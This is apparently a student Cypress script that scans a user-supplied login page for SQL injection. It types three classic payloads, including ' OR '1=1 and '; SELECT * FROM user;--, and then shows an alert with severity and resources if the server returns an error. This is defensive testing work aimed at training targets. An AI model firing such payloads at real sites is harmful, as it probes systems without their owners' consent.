/// <reference types="cypress" />
/*
Purpose: Scan a given website to see if the website has any common 
            input SQL injection vulnerabilities.
*/
const website = prompt('Enter Website URL to test: ', 'http://hackxor.sourceforge.net/cgi-bin/portal.pl');
//https://google-gruyere.appspot.com/656481160854353091272782960691620594977/login
describe('Testing SQL injection (SQLi) on given login pages', () => {
    beforeEach(()=>{
        //visit given website
        cy.visit(website);

        //Search for result pages of the login
        cy.intercept({method: '+(POST|GET)', path: '+(portal.pl|login)'}).as('loginSQL');
    })

    it('SQLi on login page using \'', () => {
        //get all input boxes
        cy.get('input:valid') 
        .then(($inputs)=>{ 

            //locate 1st input box
            //insert SQL injection
            cy.get($inputs[0]).type('\'');

            //insert known password
            cy.get($inputs[1]).type('demo');

            //submit SQL injection
            cy.get('[type=submit]').click();
        }); //end of get all input boxes
        
        //look for result
        cy.wait('@loginSQL');
        cy.get('@loginSQL').then((res)=>{
            expect(res.response.statusCode).to.equal(500);

            //display if SQL injection is successful or not
            //give explanation and resources if SQLi is successful
            window.alert(location.hostname + ' is vulnerable to SQL Injection!\n\n' + 
            'SQL Injection (SQLi) is the placement of malicious code in SQL statements, ' + 
            'via web page input (https://www.w3schools.com/sql/sql_injection.asp).\n\n' +
            'Level of severity (low, moderate, high): HIGH\n\n' +
            'Here are some resources to combat SQLi:\n' +
            '\t https://rdcu.be/cAAtJ (2004)\n'+
            '\t https://www.researchgate.net/publication/353025675_SQL_Injection_Attacks_Prevention_System_Technology_Review (2021)\n'+
            '\t https://www.researchgate.net/publication/344597081_SQL_Injection_Attacks_Countermeasures_Assessments (2021)');
        });
    })//end of 'it'

    it('SQLi on login page using \' OR \'1=1', () => {
        //get all input boxes
        cy.get('input:valid') 
        .then(($inputs)=>{ 

            //locate 1st input box
            //insert SQL injection
            cy.get($inputs[0]).type('\' OR \'1=1');

            //insert known password
            cy.get($inputs[1]).type('demo');

            //submit SQL injection
            cy.get('[type=submit]').click();
        }); //end of get all input boxes

        //look for result
        cy.wait('@loginSQL');
        cy.get('@loginSQL').then((res)=>{
            expect(res.response.statusCode).to.equal(500);

            //display if SQL injection is successful or not
            //give explanation and resources if SQLi is successful
            window.alert(location.hostname + ' is vulnerable to SQL Injection!\n\n' + 
            'SQL Injection (SQLi) is the placement of malicious code in SQL statements, ' + 
            'via web page input (https://www.w3schools.com/sql/sql_injection.asp).\n\n' +
            'Level of severity (low, moderate, high): HIGH\n\n' +
            'Here are some resources to combat SQLi:\n' +
            '\t https://rdcu.be/cAAtJ (2004)\n'+
            '\t https://www.researchgate.net/publication/353025675_SQL_Injection_Attacks_Prevention_System_Technology_Review (2021)\n'+
            '\t https://www.researchgate.net/publication/344597081_SQL_Injection_Attacks_Countermeasures_Assessments (2021)');
        });
    })//end of 'it'

    it('SQLi on login page using \'; SELECT * FROM user;--', () => {
        //get all input boxes
        cy.get('input:valid') 
        .then(($inputs)=>{ 

            //locate 1st input box
            //insert SQL injection
            cy.get($inputs[0]).type('\'; SELECT * FROM user;--');

            //insert known password
            cy.get($inputs[1]).type('demo');

            //submit SQL injection
            cy.get('[type=submit]').click();
        }); //end of get all input boxes

        //look for result
        cy.wait('@loginSQL');
        cy.get('@loginSQL').then((res)=>{
            expect(res.response.statusCode).to.equal(500);

            //display if SQL injection is successful or not
            //give explanation and resources if SQLi is successful
            window.alert(location.hostname + ' is vulnerable to SQL Injection!\n\n' + 
            'SQL Injection (SQLi) is the placement of malicious code in SQL statements, ' + 
            'via web page input (https://www.w3schools.com/sql/sql_injection.asp).\n\n' +
            'Level of severity (low, moderate, high): HIGH\n\n' +
            'Here are some resources to combat SQLi:\n' +
            '\t https://rdcu.be/cAAtJ (2004)\n'+
            '\t https://www.researchgate.net/publication/353025675_SQL_Injection_Attacks_Prevention_System_Technology_Review (2021)\n'+
            '\t https://www.researchgate.net/publication/344597081_SQL_Injection_Attacks_Countermeasures_Assessments (2021)');
        });
    })//end of 'it'
})//end of 'describe' 

/*
Need to work on:
    Bringing/Ensuring Cypress gets to a login page to begin
    Using Cypress to determine what is a successful login, invalid login, and invalid input(SQLi)
    Displaying if SQL injection is successful or not
        use window.alert(); to give explanation and resources if SQLi is successful

Last used Resources:
    https://docs.cypress.io/guides/core-concepts/introduction-to-cypress#Commands-Are-Asynchronous
    https://docs.cypress.io/api/commands/get#Syntax
    https://www.w3schools.com/cssref/css_selectors.asp
    https://www.w3schools.com/cssref/trysel.asp

    https://developer.mozilla.org/en-US/docs/Web/HTTP/Status
    https://docs.cypress.io/api/commands/intercept#Intercepting-a-response
    https://idratherbewriting.com/learnapidoc/docapis_resource_endpoints.html
    https://www.youtube.com/watch?v=aUBYVOucON0                                 //video on intercept
    https://stackoverflow.com/questions/58489006/or-operator-in-cypress-io
*/